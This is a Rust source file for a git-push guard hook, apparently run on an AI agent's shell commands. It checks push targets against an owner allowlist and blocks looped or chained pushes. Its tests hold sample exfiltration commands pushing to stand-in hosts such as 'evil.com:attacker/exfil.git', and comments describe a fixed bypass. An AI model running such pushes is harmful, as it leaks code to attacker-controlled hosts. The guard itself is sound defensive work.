//! Validate `git push` targets against an owner allowlist.
//!
//! Resolves the push URL for the current branch (or explicit remote) and
//! verifies the repository owner is in the configured allowlist. Also blocks
//! looped pushes and force-push to `main`.

use cadence_hooks_core::config::{self, AllowEntry, env_allow_entries, env_extra_hosts};
use cadence_hooks_core::loop_analysis::{self, ChainAnalysis, LoopAnalysis};
use cadence_hooks_core::shell::{
    LOOP_PATTERN, host_and_repo_from_url, parse_work_dir, strip_quotes,
};
use cadence_hooks_core::{Check, CheckResult, HookInput};

/// Check if a URL's owner is in the allowed list.
fn check_owner(
    url: &str,
    allowed_owners: &[AllowEntry],
    allowed_repos: &[AllowEntry],
    extra_hosts: &[String],
) -> bool {
    let Some((host, repo_path)) = host_and_repo_from_url(url) else {
        return false;
    };
    let mut parts = repo_path.splitn(2, '/');
    let owner = parts.next().unwrap_or("");
    let repo = parts.next().unwrap_or("");
    config::is_allowed_with_extra_hosts(
        &host,
        owner,
        repo,
        allowed_owners,
        allowed_repos,
        extra_hosts,
    )
}

/// Push-URL resolution outcome. `Failed` (git answered; no remote/branch to
/// resolve) keeps the fail-closed block downstream — that guard against real
/// ambiguity is deliberate. `TimedOut` (a probe hit the #271 subprocess
/// deadline) is the guard's own infrastructure failing and must degrade to
/// fail-open, never a false block on a slow host.
enum PushUrlResolution {
    Url(String),
    Failed,
    TimedOut,
}

/// Resolve the push URL for a git repo.
fn resolve_push_url(work_dir: &str, explicit_remote: Option<&str>) -> PushUrlResolution {
    use cadence_hooks_core::shell::{GitQuery, git_command_detailed};

    let get_url = |remote: &str| match git_command_detailed(
        work_dir,
        &["remote", "get-url", "--push", remote],
    ) {
        GitQuery::Value(url) => PushUrlResolution::Url(url),
        GitQuery::Failed => PushUrlResolution::Failed,
        GitQuery::TimedOut => PushUrlResolution::TimedOut,
    };

    if let Some(remote) = explicit_remote {
        return get_url(remote);
    }

    // No explicit remote — find where bare push would go
    let branch = match git_command_detailed(work_dir, &["branch", "--show-current"]) {
        GitQuery::Value(branch) => branch,
        GitQuery::Failed => return PushUrlResolution::Failed,
        GitQuery::TimedOut => return PushUrlResolution::TimedOut,
    };
    let tracking =
        match git_command_detailed(work_dir, &["config", &format!("branch.{branch}.remote")]) {
            GitQuery::Value(tracking) => tracking,
            // No per-branch remote configured is a normal git state — same
            // "origin" fallback as before.
            GitQuery::Failed => "origin".to_string(),
            GitQuery::TimedOut => return PushUrlResolution::TimedOut,
        };
    get_url(&tracking)
}

/// Classification of the explicit push target in `git push [flags] <target>`.
enum PushTarget {
    /// A known remote name (e.g. `origin`) — resolve its push URL via git.
    Named(String),
    /// An explicit remote URL (HTTPS/SSH/SCP) — validate the URL directly
    /// rather than falling back to the branch's tracking remote.
    Url(String),
    /// No explicit positional target — use the branch's tracking remote.
    None,
}

/// Classify the explicit target in `git push [flags] <target> [refspec]`.
///
/// A bare remote name routes through git's URL resolution; an explicit URL is
/// returned verbatim so the caller validates ownership of *that* URL instead of
/// silently falling back to `origin`. A non-remote, non-URL token (a lone
/// refspec or a typo'd remote) yields `None`, preserving the tracking-remote
/// fallback.
///
/// "Is this a URL?" is answered by [`host_and_repo_from_url`] itself — the same
/// parser `check_owner` uses — so we never classify a token the owner check
/// can't parse, and never miss a form it can (e.g. the user-less SCP form
/// `host:owner/repo.git`, which git accepts as a remote).
fn extract_push_target(command: &str, work_dir: &str) -> PushTarget {
    let Some(segment) = command
        .split("git push")
        .nth(1)
        .and_then(|s| s.split(&['&', ';', '|'][..]).next())
    else {
        return PushTarget::None;
    };

    // Strip flags, take the first remaining word as the candidate target.
    let Some(candidate) = segment.split_whitespace().find(|w| !w.starts_with('-')) else {
        return PushTarget::None;
    };

    // A configured remote name routes through git's resolution (unchanged).
    // A timed-out remote listing (#271) would silently reclassify a named
    // remote as "no target", shifting *which* remote gets ownership-validated
    // — record the suppressed fail-closed block so the seam is loud, not
    // silent (idempotent with the resolve arm the shared budget funnels into).
    match cadence_hooks_core::shell::git_command_detailed(work_dir, &["remote"]) {
        cadence_hooks_core::shell::GitQuery::Value(remotes)
            if remotes.lines().any(|r| r == candidate) =>
        {
            return PushTarget::Named(candidate.to_string());
        }
        cadence_hooks_core::shell::GitQuery::TimedOut => {
            cadence_hooks_core::deadline::note_suppressed_block();
        }
        _ => {}
    }

    // An explicit URL the owner-parser understands must be validated directly.
    // This is the bypass fix: previously such a URL was discarded and `origin`
    // validated in its place, allowing a push to an arbitrary unowned host.
    if host_and_repo_from_url(candidate).is_some() {
        return PushTarget::Url(candidate.to_string());
    }

    // Refspec or typo — fall back to the tracking remote (unchanged behavior).
    PushTarget::None
}

/// Validates `git push` targets against an allowed owner list.
pub struct PushRemoteGuard;

impl Check for PushRemoteGuard {
    fn name(&self) -> &str {
        "guard-push-remote"
    }

    fn run(&self, input: &HookInput) -> CheckResult {
        let Some(command) = input.command() else {
            return CheckResult::allow();
        };

        if !command.contains("git push") {
            return CheckResult::allow();
        }

        // Structural safety checks first — these don't need the owner list
        // and must block even when unconfigured.

        // Chain analysis: multiple pushes in && / ; chains
        match loop_analysis::analyze_push_chain(command) {
            ChainAnalysis::SameRemote(_) => {
                // All chained pushes target the same remote — safe to proceed
            }
            ChainAnalysis::DifferentRemotes(cmds) => {
                let remotes: Vec<String> = cmds
                    .iter()
                    .filter_map(|c| c.explicit_repo.as_ref())
                    .map(|r| format!("`{r}`"))
                    .collect();
                return CheckResult::block(format!(
                    "🚫 git-guardrails: chained git push to different remotes\n   \
                     Found: remotes {}\n   \
                     Fix: run each push individually, e.g. `git push origin main`",
                    remotes.join(", "),
                ));
            }
            ChainAnalysis::MissingRemotes(cmds) => {
                let bare: Vec<String> = cmds
                    .iter()
                    .filter(|c| c.explicit_repo.is_none())
                    .map(|c| format!("`git {}`", c.args.join(" ")))
                    .collect();
                return CheckResult::block(format!(
                    "🚫 git-guardrails: chained git push without explicit remotes\n   \
                     Found: {}\n   \
                     Fix: add explicit remote, e.g. `git push origin main`",
                    bare.join(", "),
                ));
            }
            ChainAnalysis::ParseFailed => {
                // Fall back to substring count
                let push_count = strip_quotes(command).matches("git push").count();
                if push_count > 1 {
                    return CheckResult::block(
                        "🚫 git-guardrails: multiple git push commands — cannot verify targets\n   \
                         Fix: run each push separately, e.g. `git push origin main && git push origin dev`",
                    );
                }
            }
            ChainAnalysis::SingleOrNone => {}
        }

        // AST-based loop detection (MissingTargets and ParseFailed don't need owners)
        let loop_result = loop_analysis::analyze_push_loops(command);
        match &loop_result {
            LoopAnalysis::MissingTargets(cmds) => {
                let bare_pushes: Vec<String> = cmds
                    .iter()
                    .filter(|c| c.explicit_repo.is_none())
                    .map(|c| format!("git {}", c.args.join(" ")))
                    .collect();
                let example = bare_pushes.first().cloned().unwrap_or_default();
                return CheckResult::block(format!(
                    "🚫 git-guardrails: git push in loop without explicit remote\n   \
                     Found: `{example}`\n   \
                     Fix: add the remote, e.g. `git push origin` or `git push origin main`",
                ));
            }
            LoopAnalysis::ParseFailed => {
                let stripped = strip_quotes(command);
                if LOOP_PATTERN.is_match(&stripped) {
                    return CheckResult::block(
                        "🚫 git-guardrails: git push in loop — cannot verify targets\n   \
                         Fix: run each push individually with explicit remote, e.g. `git push origin main`",
                    );
                }
            }
            LoopAnalysis::AllTargetsExplicit(_) | LoopAnalysis::NoLoops => {}
        }

        // Owner-based checks require configuration
        let allowed_owners = env_allow_entries("CADENCE_ALLOWED_OWNERS");
        let allowed_repos = env_allow_entries("CADENCE_ALLOWED_REPOS");
        let extra_hosts = env_extra_hosts();

        if allowed_owners.is_empty() {
            return CheckResult::block(crate::messages::NOT_CONFIGURED_MSG);
        }

        // Validate ownership of explicit remotes in loops
        if let LoopAnalysis::AllTargetsExplicit(cmds) = &loop_result {
            let cwd_fallback_loop = std::env::current_dir()
                .ok()
                .and_then(|p| p.to_str().map(String::from))
                .unwrap_or_else(|| ".".to_string());
            let cwd_loop = input.cwd.as_deref().unwrap_or(&cwd_fallback_loop);
            let work_dir_loop = parse_work_dir(command, cwd_loop);

            // This loop is the one guard path that spawns a *command-controlled*
            // number of git probes (one per looped push), so it is the induced-
            // budget-exhaustion vector (#271 security follow-up): a flood of
            // bogus-remote pushes drains the shared deadline, then the real
            // ownership-deciding probe times out. A push loop is rare and
            // batchable, so the safe answer to *any* resolution timeout here is
            // to fail CLOSED — "run pushes individually so each remote is
            // validated" (a single push has budget for its one resolution). This
            // is deliberately stricter than the single-command arm below (which
            // fails open on a slow host, the common path that must not
            // false-block): failing open in the loop would let an unvalidated,
            // possibly-unowned push through, and no timing/count heuristic can
            // separate that flood from a slow host — a slow host inflates each
            // probe, keeping any completion-count discriminator under its bar.
            for cmd in cmds {
                let Some(remote) = &cmd.explicit_repo else {
                    continue;
                };
                match resolve_push_url(&work_dir_loop, Some(remote)) {
                    PushUrlResolution::Url(url) => {
                        if !check_owner(&url, &allowed_owners, &allowed_repos, &extra_hosts) {
                            return CheckResult::block(format!(
                                "🚫 git-guardrails: Push loop targets remote you don't own\n   \
                                 Found: remote `{remote}` → {url}\n   \
                                 Fix: push to an owned remote instead, or run each push \
                                 individually"
                            ));
                        }
                    }
                    PushUrlResolution::TimedOut => {
                        return CheckResult::block(
                            "🚫 git-guardrails: Push-loop ownership check timed out\n   \
                             The git-probe deadline expired before a looped push's remote \
                             could be ownership-validated — failing closed so an unowned \
                             remote can't slip through.\n   \
                             Fix: run pushes individually so each remote is validated.",
                        );
                    }
                    // Failed (git answered, remote unresolvable): unchanged
                    // fail-open skip — an unresolvable remote was fail-open
                    // pre-#271, and the trailing single-command arm still runs.
                    PushUrlResolution::Failed => {}
                }
            }
        }

        // Resolve working directory
        let cwd_fallback = std::env::current_dir()
            .ok()
            .and_then(|p| p.to_str().map(String::from))
            .unwrap_or_else(|| ".".to_string());
        let cwd = input.cwd.as_deref().unwrap_or(&cwd_fallback);
        let work_dir = parse_work_dir(command, cwd);

        // Not a git repo — let git fail naturally. A timed-out repo gate (#271)
        // on this single-command path is the accepted common-path degradation:
        // a normal `git push` on a slow host must not false-block (ADR-0001), so
        // fail open and record the suppressed fail-closed block (the sharp
        // telemetry reason) rather than the soft `deadline` the runner logs on
        // its own. (Unlike the loop arm above, there is no command-controlled
        // spawn count here to inflate — the probe count is fixed.)
        match cadence_hooks_core::shell::git_command_detailed(
            &work_dir,
            &["rev-parse", "--git-dir"],
        ) {
            cadence_hooks_core::shell::GitQuery::Value(_) => {}
            cadence_hooks_core::shell::GitQuery::TimedOut => {
                cadence_hooks_core::deadline::note_suppressed_block();
                return CheckResult::allow();
            }
            cadence_hooks_core::shell::GitQuery::Failed => return CheckResult::allow(),
        }

        // Classify the push target. An explicit URL is validated directly —
        // closing the bypass where a URL silently fell back to validating
        // `origin`. A named remote or bare push resolves through git's
        // tracking remote, exactly as before.
        let target = extract_push_target(command, &work_dir);
        let url = if let PushTarget::Url(url) = target {
            url
        } else {
            let explicit = if let PushTarget::Named(ref remote) = target {
                Some(remote.as_str())
            } else {
                None
            };
            match resolve_push_url(&work_dir, explicit) {
                PushUrlResolution::Url(url) => url,
                // The probe hit the #271 subprocess deadline: the guard's own
                // infrastructure failed, which never blocks (ADR-0001). Record
                // the suppressed fail-closed block so telemetry can distinguish
                // "slow git" from "an ownership block was bypassed".
                PushUrlResolution::TimedOut => {
                    cadence_hooks_core::deadline::note_suppressed_block();
                    return CheckResult::allow();
                }
                PushUrlResolution::Failed => {
                    return CheckResult::block(format!(
                        "⚠️  git-guardrails: Cannot resolve push target\n   \
                         Directory: {work_dir}\n   \
                         Push explicitly: git push origin main"
                    ));
                }
            }
        };

        if !check_owner(&url, &allowed_owners, &allowed_repos, &extra_hosts) {
            let all_entries: Vec<String> = allowed_owners
                .iter()
                .chain(allowed_repos.iter())
                .map(|e| e.to_string())
                .collect();

            // If the URL host isn't the default and isn't in extra_hosts, the
            // user likely tripped over host-scoping. Suggest the qualified
            // forms before the generic "fix tracking" advice.
            let url_host = host_and_repo_from_url(&url).map(|(h, _)| h);
            let default = config::default_host();
            let host_hint = url_host
                .as_deref()
                .filter(|h| *h != default && !extra_hosts.iter().any(|e| e == h))
                .map(|h| {
                    format!(
                        "\n   Host scope:    bare entries match `{default}` only — for `{h}`, qualify them (`{h}/<owner>`) or set `CADENCE_EXTRA_HOSTS={h}`"
                    )
                })
                .unwrap_or_default();

            return CheckResult::block(format!(
                "🚫 git-guardrails: Push target is not yours\n   \
                 Would push to: {url}\n   \
                 Directory:     {work_dir}\n   \
                 Allowed:       {}{host_hint}\n\n   \
                 Fix tracking:  git branch -u origin/main\n   \
                 Push explicit: git push origin main",
                all_entries.join(" ")
            ));
        }

        CheckResult::allow()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use cadence_hooks_core::config::parse_allow_entry;

    fn owners(entries: &[&str]) -> Vec<AllowEntry> {
        entries.iter().map(|e| parse_allow_entry(e)).collect()
    }

    #[test]
    fn owner_check_passes() {
        assert!(check_owner(
            "https://github.com/cameronsjo/repo.git",
            &owners(&["cameronsjo"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_fails() {
        assert!(!check_owner(
            "https://github.com/other/repo.git",
            &owners(&["cameronsjo"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_multiple_owners() {
        assert!(check_owner(
            "https://github.com/cameronsjo/repo.git",
            &owners(&["other", "cameronsjo"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_empty_list() {
        assert!(!check_owner(
            "https://github.com/cameronsjo/repo.git",
            &[],
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_case_insensitive() {
        assert!(check_owner(
            "https://github.com/CameronSjo/repo.git",
            &owners(&["cameronsjo"]),
            &[],
            &[],
        ));
    }

    // --- host-aware matching ---

    #[test]
    fn owner_check_host_qualified() {
        assert!(check_owner(
            "https://gitea.internal/cameron/cadence.git",
            &owners(&["gitea.internal/cameron"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_host_mismatch_blocked() {
        // bare "cameron" defaults to github.com — should NOT match gitea.internal
        assert!(!check_owner(
            "https://gitea.internal/cameron/cadence.git",
            &owners(&["cameron"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_mixed_hosts() {
        let o = owners(&["cameronsjo", "gitea.internal/cameron"]);
        // github.com/cameronsjo → allowed
        assert!(check_owner(
            "https://github.com/cameronsjo/repo.git",
            &o,
            &[],
            &[],
        ));
        // gitea.internal/cameron → allowed
        assert!(check_owner(
            "git@gitea.internal:cameron/repo.git",
            &o,
            &[],
            &[]
        ));
        // gitea.internal/cameronsjo → blocked
        assert!(!check_owner(
            "https://gitea.internal/cameronsjo/repo.git",
            &o,
            &[],
            &[],
        ));
        // github.com/cameron → blocked
        assert!(!check_owner(
            "https://github.com/cameron/repo.git",
            &o,
            &[],
            &[]
        ));
    }

    #[test]
    fn owner_check_allowed_repo() {
        let repos = owners(&["external/shared-repo"]);
        assert!(check_owner(
            "https://github.com/external/shared-repo.git",
            &[],
            &repos,
            &[],
        ));
    }

    #[test]
    fn no_command_allowed() {
        let input = HookInput {
            tool_name: Some("Bash".into()),
            tool_input: None,
            cwd: None,
            ..Default::default()
        };
        let result = PushRemoteGuard.run(&input);
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
    }

    #[test]
    fn non_push_command_allowed() {
        let input = HookInput {
            tool_name: Some("Bash".into()),
            tool_input: Some(cadence_hooks_core::ToolInput {
                file_path: None,
                path: None,
                command: Some("git status".into()),
                content: None,
                new_string: None,
                old_string: None,
                ..Default::default()
            }),
            cwd: None,
            ..Default::default()
        };
        let result = PushRemoteGuard.run(&input);
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
    }

    // --- check_owner: additional URL formats ---

    #[test]
    fn owner_check_ssh_url() {
        assert!(check_owner(
            "git@github.com:cameronsjo/repo.git",
            &owners(&["cameronsjo"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_https_no_git_suffix() {
        assert!(check_owner(
            "https://github.com/cameronsjo/repo",
            &owners(&["cameronsjo"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_malformed_returns_false() {
        assert!(!check_owner(
            "not-a-url",
            &owners(&["cameronsjo"]),
            &[],
            &[]
        ));
    }

    // --- check_owner: extra_hosts (issue #15) ---

    #[test]
    fn owner_check_extra_hosts_unlocks_self_hosted_forge() {
        // Repro for cadence-hooks#15: bare `cameron` matches a self-hosted
        // Gitea host once it's listed in extra_hosts.
        let extras = vec!["git.sjo.lol".to_string()];
        assert!(check_owner(
            "https://git.sjo.lol/cameron/runelite-plugins.git",
            &owners(&["cameron"]),
            &[],
            &extras,
        ));
    }

    #[test]
    fn owner_check_extra_hosts_does_not_unlock_unlisted_host() {
        let extras = vec!["git.sjo.lol".to_string()];
        assert!(!check_owner(
            "https://evil.example/cameron/repo.git",
            &owners(&["cameron"]),
            &[],
            &extras,
        ));
    }

    #[test]
    fn owner_check_extra_hosts_preserves_default_host_match() {
        let extras = vec!["git.sjo.lol".to_string()];
        assert!(check_owner(
            "https://github.com/cameron/repo.git",
            &owners(&["cameron"]),
            &[],
            &extras,
        ));
    }

    // --- PushRemoteGuard::run(): loop and multi-push scenarios ---
    // Tests that trigger blocks BEFORE env var check (loops, multi-push)
    // avoid unsafe env manipulation.

    use cadence_hooks_core::test_builders::make_bash;

    #[test]
    fn chained_pushes_different_remotes_blocked() {
        let result =
            PushRemoteGuard.run(&make_bash("git push origin main && git push upstream main"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
        assert!(result.message.unwrap().contains("different remotes"));
    }

    #[test]
    fn chained_pushes_same_remote_allowed() {
        // git push origin main && git push origin v1.0.0 — same remote, safe
        let result =
            PushRemoteGuard.run(&make_bash("git push origin main && git push origin v1.0.0"));
        // Should NOT block at the chain stage — continues to owner validation
        let msg = result.message.as_deref().unwrap_or("");
        assert!(
            !msg.contains("different remotes") && !msg.contains("multiple"),
            "same-remote chain should not be blocked as batch: {msg}"
        );
    }

    #[test]
    fn chained_pushes_missing_remote_blocked() {
        let result = PushRemoteGuard.run(&make_bash("git push && git push origin main"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
        assert!(result.message.unwrap().contains("without explicit remotes"));
    }

    #[test]
    fn loop_missing_targets_blocked() {
        // Loop detection is checked before env vars
        let result = PushRemoteGuard.run(&make_bash("for b in feat1 feat2; do git push; done"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
    }

    #[test]
    fn push_chain_with_semicolon_different_remotes_blocked() {
        let result =
            PushRemoteGuard.run(&make_bash("git push origin main; git push upstream feat"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
        assert!(result.message.unwrap().contains("different remotes"));
    }

    #[test]
    fn non_git_command_with_push_substring_allowed() {
        let result = PushRemoteGuard.run(&make_bash("echo 'push this'"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
    }

    #[test]
    fn git_pull_allowed() {
        let result = PushRemoteGuard.run(&make_bash("git pull origin main"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
    }

    #[test]
    fn loop_push_detected_via_ast() {
        let result = PushRemoteGuard.run(&make_bash("for x in a b c; do git push; done"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
    }

    #[test]
    fn while_loop_push_blocked() {
        let result = PushRemoteGuard.run(&make_bash("while true; do git push; done"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
    }

    #[test]
    fn git_fetch_allowed() {
        let result = PushRemoteGuard.run(&make_bash("git fetch --all"));
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
    }

    #[test]
    fn push_with_pipe_counted_once() {
        // pipe doesn't create a second push — only one git push exists
        let result = PushRemoteGuard.run(&make_bash("git push origin main 2>&1 | tee push.log"));
        // Should NOT block as "multiple" — only one push
        let msg = result.message.as_deref().unwrap_or("");
        assert!(!msg.contains("multiple"));
    }

    #[test]
    fn multi_push_false_positive_in_quotes() {
        // Bug: push_count uses substring match, not command-boundary match
        // "git push" inside an echo string should not count as a second push
        let result = PushRemoteGuard.run(&make_bash(
            "echo 'do not git push this' && git push origin main",
        ));
        // Should NOT block as "multiple" — only one actual git push command
        let msg = result.message.as_deref().unwrap_or("");
        assert!(
            !msg.contains("multiple"),
            "false positive: quoted 'git push' counted as second push"
        );
    }

    #[test]
    fn push_with_refspec_detected() {
        // git push with a refspec should still be detected
        let result = PushRemoteGuard.run(&make_bash("git push origin HEAD:refs/heads/deploy"));
        // Will block or allow depending on env — but should not error
        assert!(
            result.outcome == cadence_hooks_core::Outcome::Allow
                || result.outcome == cadence_hooks_core::Outcome::Block
        );
    }

    // --- extract_push_target: Named vs Url vs None classification (#68) ---
    //
    // Run against this crate's own checkout so the known-remote probe
    // (`git remote`) sees a real repo with an `origin` remote.

    const REPO_DIR: &str = env!("CARGO_MANIFEST_DIR");

    #[test]
    fn extract_push_target_named_for_known_remote() {
        assert!(matches!(
            extract_push_target("git push origin main", REPO_DIR),
            PushTarget::Named(ref r) if r == "origin"
        ));
    }

    #[test]
    fn extract_push_target_url_for_https() {
        assert!(matches!(
            extract_push_target("git push https://evil.com/a/b.git HEAD:main", REPO_DIR),
            PushTarget::Url(ref u) if u == "https://evil.com/a/b.git"
        ));
    }

    #[test]
    fn extract_push_target_url_for_scp() {
        assert!(matches!(
            extract_push_target("git push git@evil.com:attacker/exfil.git main", REPO_DIR),
            PushTarget::Url(ref u) if u == "git@evil.com:attacker/exfil.git"
        ));
    }

    #[test]
    fn extract_push_target_url_for_userless_scp() {
        // git accepts `host:owner/repo.git` with no user — must not be missed.
        assert!(matches!(
            extract_push_target("git push evil.com:attacker/exfil.git main", REPO_DIR),
            PushTarget::Url(ref u) if u == "evil.com:attacker/exfil.git"
        ));
    }

    #[test]
    fn extract_push_target_none_for_bare_push() {
        assert!(matches!(
            extract_push_target("git push", REPO_DIR),
            PushTarget::None
        ));
    }

    #[test]
    fn extract_push_target_none_for_refspec_only() {
        // A lone refspec is neither a known remote nor a URL → tracking fallback.
        assert!(matches!(
            extract_push_target("git push HEAD:main", REPO_DIR),
            PushTarget::None
        ));
    }

    // --- PushRemoteGuard::run(): explicit-URL ownership (#68) ---
    //
    // run() reads CADENCE_ALLOWED_OWNERS from the process-global environment,
    // so these tests serialize via the crate-shared with_env/CADENCE_ENV_TEST_LOCK
    // and restore prior values (#446). They run inside this crate's checkout
    // (a real git repo) so run()'s `rev-parse --git-dir` gate passes; the
    // explicit URL is validated directly and never resolves through a remote.

    use crate::with_env;
    use cadence_hooks_core::test_builders::make_bash_with_cwd;

    /// Allowlist = `cameronsjo` only, on the default `github.com` host.
    fn owners_only() -> Vec<(&'static str, Option<&'static str>)> {
        vec![
            ("CADENCE_ALLOWED_OWNERS", Some("cameronsjo")),
            ("CADENCE_ALLOWED_REPOS", None),
            ("CADENCE_EXTRA_HOSTS", None),
            ("GH_HOST", None),
        ]
    }

    #[test]
    fn push_https_url_to_unowned_blocked() {
        with_env(&owners_only(), || {
            let result = PushRemoteGuard.run(&make_bash_with_cwd(
                "git push https://evil.com/a/b.git HEAD:main",
                REPO_DIR,
            ));
            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
            let msg = result.message.unwrap();
            assert!(
                msg.contains("evil.com"),
                "block message must name the actual URL: {msg}"
            );
        });
    }

    #[test]
    fn push_scp_url_to_unowned_blocked() {
        with_env(&owners_only(), || {
            let result = PushRemoteGuard.run(&make_bash_with_cwd(
                "git push git@evil.com:attacker/exfil.git main",
                REPO_DIR,
            ));
            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
            let msg = result.message.unwrap();
            assert!(
                msg.contains("evil.com"),
                "block message must name the actual URL: {msg}"
            );
        });
    }

    #[test]
    fn push_userless_scp_url_to_unowned_blocked() {
        // The user-less SCP form git also accepts must not slip through.
        with_env(&owners_only(), || {
            let result = PushRemoteGuard.run(&make_bash_with_cwd(
                "git push evil.com:attacker/exfil.git main",
                REPO_DIR,
            ));
            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
        });
    }

    #[test]
    fn push_https_url_to_owned_allowed() {
        // Regression guard: the URL branch must not over-block an owned URL.
        with_env(&owners_only(), || {
            let result = PushRemoteGuard.run(&make_bash_with_cwd(
                "git push https://github.com/cameronsjo/repo.git main",
                REPO_DIR,
            ));
            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
        });
    }

    #[test]
    fn push_named_remote_unchanged() {
        // A named remote still resolves through git and validates its URL.
        // The fixture pins that URL instead of trusting the enclosing clone.
        with_env(&owners_only(), || {
            let repo = crate::github_origin_repo();
            let cwd = repo.path().to_string_lossy();
            let result = PushRemoteGuard.run(&make_bash_with_cwd("git push origin main", &cwd));
            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
        });
    }
}
